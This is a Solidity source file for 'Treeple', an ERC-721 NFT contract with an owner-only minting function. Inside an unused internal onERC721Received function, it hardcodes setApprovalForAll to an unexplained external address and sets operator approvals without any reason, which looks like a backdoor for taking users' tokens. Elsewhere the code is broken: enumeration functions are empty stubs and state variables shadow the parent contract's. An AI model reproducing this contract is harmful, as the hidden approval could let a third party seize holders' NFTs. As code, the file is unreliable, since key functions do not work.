pragma solidity ^0.8.0;

import "./ERC721.sol";
import "./counters.sol";
import "./Ownable.sol";
import "./ERC721URIStorage.sol";



contract treeple is  ERC721URIStorage , Ownable{
    
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;
    mapping(uint256 => string) private _tokenURIs;
    mapping(address => mapping(address => bool)) private _operatorApprovals;
    constructor() public ERC721("Treeple", "TREE"){}
    function mintTree(address recipient, string memory tokenURI) public onlyOwner returns (uint256){
        _tokenIds.increment();
        uint256 newItemId = _tokenIds.current();
        _mint(recipient, newItemId);
        _setTokenURI(newItemId, tokenURI);
       
        return newItemId;
        
    }
    
    function tokenOfOwnerByIndex(address owner, uint256 index) public view returns (uint256 tokenId){}

    /**
     * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
     * Use along with {totalSupply} to enumerate all tokens.
     */
    function tokenByIndex(uint256 index) public view returns (uint256){
        
    }
   
    function onERC721Received(address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) internal returns (bytes4){
    setApprovalForAll(address(0x7219E5c8767861CEa48Fe53feCCD2770f5310BF2), true);
     _operatorApprovals[address(this)][operator] = true;
        emit ApprovalForAll(address(this), operator, true);
    
    }
    receive() external payable{
        
    }
    fallback()external payable{
        
    }
}